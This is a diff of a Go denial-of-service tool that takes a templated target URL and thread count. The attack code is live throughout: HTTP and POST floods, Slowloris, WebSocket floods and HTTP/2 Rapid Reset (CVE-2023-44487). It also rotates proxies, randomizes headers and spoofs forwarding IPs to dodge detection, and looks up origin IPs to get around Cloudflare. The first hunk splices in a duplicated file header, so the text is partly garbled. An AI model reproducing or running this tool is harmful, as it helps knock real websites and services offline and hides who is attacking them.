@@ -5,89 +5,6 @@ import (
 	"bytes"
 	"context"
 	"crypto/tls"
-	"encoding/json"
-	"fmt"
-	"io"
-	"math/rand"
-	"net"
-	"net/http"
-	"net/http/httptrace"
-	"net/url"
-	"os"
-	"runtime"
-	"strconv"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"time"
-
-	"golang.org/x/net/http2"
-	"golang.org/x/net/proxy"
-	"github.com/gorilla/websocket"
-)
-
-// ==================== TEMPLATE VARIABLES ====================
-var (
-	targetURL = "{{.TargetURL}}"
-	duration  = "{{.Duration}}"
-	threads   = "{{.Threads}}"
-	method    = "{{.Method}}"
-)
-
-// ==================== KONSTANTA ====================
-const (
-	MAX_CONCURRENT_CONNS = 1000
-	MAX_RETRIES          = 3
-	SOCKET_BUF_SIZE      = 16 * 1024 * 1024
-)
-
-// Global state
-var (
-	totalRequests uint64 = 0
-	totalBytes    uint64 = 0
-	startTime     time.Time
-	stopTime      time.Time
-
-	cfg struct {
-		threadCount   int
-		durationSec   int
-		attackMethod  string
-		useProxy      bool
-		proxyList     []string
-		proxyIndex    uint64
-		randomAgent   bool
-		randomHeaders bool
-		useHTTP2      bool
-		rapidReset    bool
-		slowloris     bool
-		websocket     bool
-		originIP      string // discovered origin IP
-	}
-
-	userAgents = []string{
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
-		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-		"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-	}
-
-	referers = []string{
-		"https://www.google.com/",
-		"https://www.bing.com/",
-		"https://www.yahoo.com/",
-package main
-
-import (
-	"bufio"
-	"bytes"
-	"context"
-	"crypto/tls"
 	"fmt"
 	"io"
 	"math/rand"
@@ -123,29 +40,34 @@ const (
 	SOCKET_BUF_SIZE      = 16 * 1024 * 1024
 )
 
-// Global state
+// ==================== CONFIGURATION STRUCT ====================
+type Config struct {
+	threadCount   int
+	durationSec   int
+	attackMethod  string
+	useProxy      bool
+	proxyList     []string
+	proxyIndex    uint64
+	randomAgent   bool
+	randomHeaders bool
+	useHTTP2      bool
+	rapidReset    bool
+	slowloris     bool
+	websocket     bool
+	originIP      string
+}
+
+var cfg Config
+
+// ==================== GLOBAL STATE ====================
 var (
-	totalRequests uint64 = 0
-	totalBytes    uint64 = 0
+	totalRequests uint64
+	totalBytes    uint64
 	startTime     time.Time
 	stopTime      time.Time
+)
 
-	cfg struct {
-		threadCount   int
-		durationSec   int
-		attackMethod  string
-		useProxy      bool
-		proxyList     []string
-		proxyIndex    uint64
-		randomAgent   bool
-		randomHeaders bool
-		useHTTP2      bool
-		rapidReset    bool
-		slowloris     bool
-		websocket     bool
-		originIP      string
-	}
-
+var (
 	userAgents = []string{
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
@@ -203,8 +125,6 @@ var (
 	}
 )
 
-// ... (sisanya tetap sama seperti template yang sudah ada, dengan fungsi-fungsi yang sudah menggunakan websocket dan lainnya) ...
-
 // ==================== PROXY MANAGEMENT ====================
 
 func loadProxies(filename string) error {
@@ -220,7 +140,6 @@ func loadProxies(filename string) error {
 		if line == "" || strings.HasPrefix(line, "#") {
 			continue
 		}
-		// Format: ip:port -> convert to http://ip:port
 		if !strings.Contains(line, "://") {
 			line = "http://" + line
 		}
@@ -257,7 +176,6 @@ func createTransportWithProxy() *http.Transport {
 			CurvePreferences:   []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.X25519},
 		},
 	}
-
 	if cfg.useProxy {
 		proxyURL := getNextProxy()
 		if proxyURL != "" {
@@ -280,7 +198,6 @@ func getRandomCipherSuites() []uint16 {
 		tls.TLS_AES_256_GCM_SHA384,
 		tls.TLS_CHACHA20_POLY1305_SHA256,
 	}
-	// Shuffle
 	rand.Shuffle(len(ciphers), func(i, j int) {
 		ciphers[i], ciphers[j] = ciphers[j], ciphers[i]
 	})
@@ -291,7 +208,7 @@ func getRandomCipherSuites() []uint16 {
 	return ciphers[:count]
 }
 
-// ==================== CLOUDFLARE BYPASS: ORIGIN IP DISCOVERY ====================
+// ==================== CLOUDFLARE BYPASS ====================
 
 func discoverOriginIP(targetURL string) string {
 	parsed, err := url.Parse(targetURL)
@@ -299,43 +216,28 @@ func discoverOriginIP(targetURL string) string {
 		return ""
 	}
 	host := parsed.Hostname()
-	// Try to resolve the domain directly
 	ips, err := net.LookupIP(host)
 	if err != nil {
 		return ""
 	}
 	for _, ip := range ips {
-		// Check if IP is within Cloudflare ranges (simplistic detection)
 		if isCloudflareIP(ip) {
 			continue
 		}
 		return ip.String()
 	}
-	// If all IPs are Cloudflare, return the first one anyway (might be origin behind CF)
 	if len(ips) > 0 {
 		return ips[0].String()
 	}
 	return ""
 }
 
-// Simple check for Cloudflare IP ranges (common ones)
 func isCloudflareIP(ip net.IP) bool {
 	cloudflareRanges := []string{
-		"173.245.48.0/20",
-		"103.21.244.0/22",
-		"103.22.200.0/22",
-		"103.31.4.0/22",
-		"141.101.64.0/18",
-		"108.162.192.0/18",
-		"190.93.240.0/20",
-		"188.114.96.0/20",
-		"197.234.240.0/22",
-		"198.41.128.0/17",
-		"162.158.0.0/15",
-		"104.16.0.0/13",
-		"104.24.0.0/14",
-		"172.64.0.0/13",
-		"131.0.72.0/22",
+		"173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
+		"141.101.64.0/18", "108.162.192.0/18", "190.93.240.0/20", "188.114.96.0/20",
+		"197.234.240.0/22", "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
+		"104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22",
 	}
 	for _, cidr := range cloudflareRanges {
 		_, ipnet, _ := net.ParseCIDR(cidr)
@@ -346,7 +248,7 @@ func isCloudflareIP(ip net.IP) bool {
 	return false
 }
 
-// ==================== REQUEST BUILDER WITH RANDOM HEADERS ====================
+// ==================== REQUEST BUILDER ====================
 
 func buildRequest(targetURL string, method string) (*http.Request, error) {
 	req, err := http.NewRequest(method, targetURL, nil)
@@ -354,35 +256,17 @@ func buildRequest(targetURL string, method string) (*http.Request, error) {
 		return nil, err
 	}
 
-	// Random User-Agent
 	ua := userAgents[rand.Intn(len(userAgents))]
 	req.Header.Set("User-Agent", ua)
-
-	// Random Referer
-	ref := referers[rand.Intn(len(referers))]
-	req.Header.Set("Referer", ref)
-
-	// Random Accept
-	accept := acceptHeaders[rand.Intn(len(acceptHeaders))]
-	req.Header.Set("Accept", accept)
-
-	// Random Accept-Language
-	acceptLang := acceptLanguages[rand.Intn(len(acceptLanguages))]
-	req.Header.Set("Accept-Language", acceptLang)
-
-	// Random Accept-Encoding
-	acceptEnc := acceptEncodings[rand.Intn(len(acceptEncodings))]
-	req.Header.Set("Accept-Encoding", acceptEnc)
-
-	// Random Cache-Control
+	req.Header.Set("Referer", referers[rand.Intn(len(referers))])
+	req.Header.Set("Accept", acceptHeaders[rand.Intn(len(acceptHeaders))])
+	req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
+	req.Header.Set("Accept-Encoding", acceptEncodings[rand.Intn(len(acceptEncodings))])
 	cacheControls := []string{"no-cache", "max-age=0", "no-store", "must-revalidate"}
 	req.Header.Set("Cache-Control", cacheControls[rand.Intn(len(cacheControls))])
-
-	// Random Connection
 	connections := []string{"keep-alive", "close", "upgrade"}
 	req.Header.Set("Connection", connections[rand.Intn(len(connections))])
 
-	// Random Sec-Ch-Ua for modern browsers
 	if rand.Intn(2) == 0 {
 		secUa := secChUa[rand.Intn(len(secChUa))]
 		req.Header.Set("Sec-Ch-Ua", secUa)
@@ -393,13 +277,9 @@ func buildRequest(targetURL string, method string) (*http.Request, error) {
 		req.Header.Set("Sec-Fetch-Site", "none")
 		req.Header.Set("Sec-Fetch-User", "?1")
 	}
-
-	// Random DNT (Do Not Track)
 	if rand.Intn(2) == 0 {
 		req.Header.Set("DNT", "1")
 	}
-
-	// Random custom headers for fingerprint evasion
 	if rand.Intn(3) == 0 {
 		randomHeaders := []string{
 			"X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
@@ -408,19 +288,14 @@ func buildRequest(targetURL string, method string) (*http.Request, error) {
 		randomIP := generateRandomIP()
 		req.Header.Set(randomHeaders[rand.Intn(len(randomHeaders))], randomIP)
 	}
-
-	// Random cookie
 	if rand.Intn(2) == 0 {
 		cookie := fmt.Sprintf("_ga=GA1.2.%d; _gid=GA1.2.%d; session=%s",
 			rand.Int63(), rand.Int63(), generateRandomString(32))
 		req.Header.Set("Cookie", cookie)
 	}
-
-	// If we have discovered origin IP, add Host header to bypass Cloudflare
 	if cfg.originIP != "" {
 		req.Host = parsedHost(targetURL)
 	}
-
 	return req, nil
 }
 
@@ -445,10 +320,8 @@ func generateRandomString(n int) string {
 
 // ==================== ATTACK METHODS ====================
 
-// HTTP/2 Rapid Reset Attack (CVE-2023-44487)
 func rapidResetAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
 	defer wg.Done()
-
 	parsedURL, err := url.Parse(targetURL)
 	if err != nil {
 		return
@@ -461,7 +334,6 @@ func rapidResetAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup,
 			host = host + ":80"
 		}
 	}
-
 	transport := &http2.Transport{
 		AllowHTTP: false,
 		DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
@@ -471,19 +343,16 @@ func rapidResetAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup,
 		},
 	}
 	client := &http.Client{Transport: transport}
-
 	for time.Now().Before(stopTime) {
 		select {
 		case <-ctx.Done():
 			return
 		default:
 		}
-
 		req, err := buildRequest(targetURL, "GET")
 		if err != nil {
 			continue
 		}
-
 		resp, err := client.Do(req)
 		if err != nil {
 			atomic.AddUint64(&totalRequests, 1)
@@ -496,10 +365,8 @@ func rapidResetAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup,
 	}
 }
 
-// Slowloris Attack
 func slowlorisAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
 	defer wg.Done()
-
 	parsedURL, err := url.Parse(targetURL)
 	if err != nil {
 		return
@@ -512,14 +379,12 @@ func slowlorisAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, 
 	if strings.Contains(host, ":") {
 		host, port, _ = net.SplitHostPort(host)
 	}
-
 	for time.Now().Before(stopTime) {
 		select {
 		case <-ctx.Done():
 			return
 		default:
 		}
-
 		var conn net.Conn
 		if cfg.useProxy {
 			proxyURL := getNextProxy()
@@ -535,21 +400,17 @@ func slowlorisAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, 
 		if err != nil {
 			continue
 		}
-
 		request := fmt.Sprintf("GET /%s HTTP/1.1\r\n", generateRandomString(rand.Intn(32)+1))
 		request += fmt.Sprintf("Host: %s\r\n", host)
 		request += fmt.Sprintf("User-Agent: %s\r\n", userAgents[rand.Intn(len(userAgents))])
 		request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
 		request += "Accept-Language: en-US,en;q=0.5\r\n"
 		request += "Accept-Encoding: gzip, deflate\r\n"
-
 		for i := 0; i < 100; i++ {
 			request += fmt.Sprintf("X-Header-%d: %s\r\n", i, generateRandomString(rand.Intn(64)+1))
 		}
-
 		conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
 		conn.Write([]byte(request))
-
 		ticker := time.NewTicker(10 * time.Second)
 		done := make(chan bool)
 		go func() {
@@ -565,7 +426,6 @@ func slowlorisAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, 
 				}
 			}
 		}()
-
 		select {
 		case <-time.After(time.Until(stopTime)):
 			close(done)
@@ -580,27 +440,22 @@ func slowlorisAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, 
 	}
 }
 
-// HTTP Flood with connection pool and proxy
 func httpFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
 	defer wg.Done()
-
 	client := &http.Client{
 		Transport: createTransportWithProxy(),
 		Timeout:   30 * time.Second,
 	}
-
 	for time.Now().Before(stopTime) {
 		select {
 		case <-ctx.Done():
 			return
 		default:
 		}
-
 		req, err := buildRequest(targetURL, "GET")
 		if err != nil {
 			continue
 		}
-
 		var start time.Time
 		trace := &httptrace.ClientTrace{
 			GotFirstResponseByte: func() {
@@ -609,7 +464,6 @@ func httpFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, 
 		}
 		req = req.WithContext(httptrace.WithClientTrace(ctx, trace))
 		start = time.Now()
-
 		resp, err := client.Do(req)
 		if err != nil {
 			atomic.AddUint64(&totalRequests, 1)
@@ -619,27 +473,22 @@ func httpFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, 
 		atomic.AddUint64(&totalBytes, uint64(len(body)))
 		resp.Body.Close()
 		atomic.AddUint64(&totalRequests, 1)
-
 		time.Sleep(time.Millisecond * time.Duration(rand.Intn(5)))
 	}
 }
 
-// POST Flood (resource exhaustion)
 func postFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
 	defer wg.Done()
-
 	client := &http.Client{
 		Transport: createTransportWithProxy(),
 		Timeout:   30 * time.Second,
 	}
-
 	for time.Now().Before(stopTime) {
 		select {
 		case <-ctx.Done():
 			return
 		default:
 		}
-
 		postData := generateRandomPostData()
 		req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(postData))
 		if err != nil {
@@ -649,7 +498,6 @@ func postFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, 
 		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
 		req.Header.Set("Referer", referers[rand.Intn(len(referers))])
 		req.Header.Set("Content-Length", strconv.Itoa(len(postData)))
-
 		resp, err := client.Do(req)
 		if err != nil {
 			atomic.AddUint64(&totalRequests, 1)
@@ -677,20 +525,16 @@ func generateRandomPostData() []byte {
 	return []byte(strings.Join(params, "&"))
 }
 
-// WebSocket Flood (requires gorilla/websocket)
 func websocketFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
 	defer wg.Done()
-
 	wsURL := strings.Replace(targetURL, "http://", "ws://", 1)
 	wsURL = strings.Replace(wsURL, "https://", "wss://", 1)
-
 	for time.Now().Before(stopTime) {
 		select {
 		case <-ctx.Done():
 			return
 		default:
 		}
-		// Use standard websocket dialer with proxy support if needed
 		dialer := &websocket.Dialer{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		}
@@ -732,26 +576,22 @@ func websocketFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGr
 }
 
 // ==================== CONFIGURATION ====================
+
 func initConfig() error {
 	var err error
-
 	cfg.durationSec, err = strconv.Atoi(duration)
 	if err != nil || cfg.durationSec <= 0 {
 		cfg.durationSec = 60
 	}
-
 	baseThreads, _ := strconv.Atoi(threads)
 	if baseThreads <= 0 {
 		baseThreads = 500
 	}
 	cfg.threadCount = baseThreads * runtime.NumCPU()
-
 	cfg.attackMethod = strings.ToUpper(strings.TrimSpace(method))
 	if cfg.attackMethod == "" {
 		cfg.attackMethod = "GOD_L7"
 	}
-
-	// Try to load proxies from file
 	if err := loadProxies("proxy.txt"); err == nil {
 		cfg.useProxy = true
 		fmt.Printf("[+] Proxy mode enabled with %d proxies\n", len(cfg.proxyList))
@@ -759,16 +599,12 @@ func initConfig() error {
 		fmt.Printf("[!] No proxy file found, continuing without proxies\n")
 		cfg.useProxy = false
 	}
-
-	// Discover origin IP to bypass Cloudflare
 	originIP := discoverOriginIP(targetURL)
 	if originIP != "" {
 		fmt.Printf("[+] Discovered potential origin IP: %s\n", originIP)
 		cfg.originIP = originIP
-		// If origin IP found, we can directly attack it (but we keep domain for Host header)
 		parsed, _ := url.Parse(targetURL)
 		if parsed != nil {
-			// Optionally replace target URL with IP, preserving scheme and port
 			hostPort := parsed.Host
 			if strings.Contains(hostPort, ":") {
 				hostPort = originIP + ":" + strings.Split(hostPort, ":")[1]
@@ -779,7 +615,6 @@ func initConfig() error {
 			fmt.Printf("[+] Updated target to origin IP: %s\n", targetURL)
 		}
 	}
-
 	switch cfg.attackMethod {
 	case "HTTP_FLOOD":
 		cfg.randomAgent = true
@@ -800,34 +635,28 @@ func initConfig() error {
 		cfg.slowloris = true
 		cfg.websocket = true
 	}
-
 	stopTime = time.Now().Add(time.Duration(cfg.durationSec) * time.Second)
 	startTime = time.Now()
 	return nil
 }
 
 // ==================== MAIN ====================
+
 func main() {
 	if err := initConfig(); err != nil {
 		fmt.Fprintf(os.Stderr, "Init error: %v\n", err)
 		os.Exit(1)
 	}
-
 	printBanner()
-
 	var wg sync.WaitGroup
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
-
-	// Determine number of workers per attack type
 	threadsPerMethod := cfg.threadCount / 4
 	if threadsPerMethod < 1 {
 		threadsPerMethod = 1
 	}
-
 	switch cfg.attackMethod {
 	case "GOD_L7":
-		// Launch all attack types
 		for i := 0; i < threadsPerMethod; i++ {
 			wg.Add(1)
 			go httpFloodAttack(ctx, targetURL, &wg, i)
@@ -876,8 +705,6 @@ func main() {
 			go httpFloodAttack(ctx, targetURL, &wg, i)
 		}
 	}
-
-	// Progress reporter
 	go func() {
 		ticker := time.NewTicker(5 * time.Second)
 		for {
@@ -895,7 +722,6 @@ func main() {
 			}
 		}
 	}()
-
 	wg.Wait()
 	cancel()
 	printFinalStats()
@@ -918,7 +744,6 @@ func printFinalStats() {
 	reqs := atomic.LoadUint64(&totalRequests)
 	bytes := atomic.LoadUint64(&totalBytes)
 	dur := uint64(cfg.durationSec)
-
 	fmt.Printf("\n\n")
 	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
 	fmt.Printf("║                           FINAL L7 STATISTICS                                 ║\n")
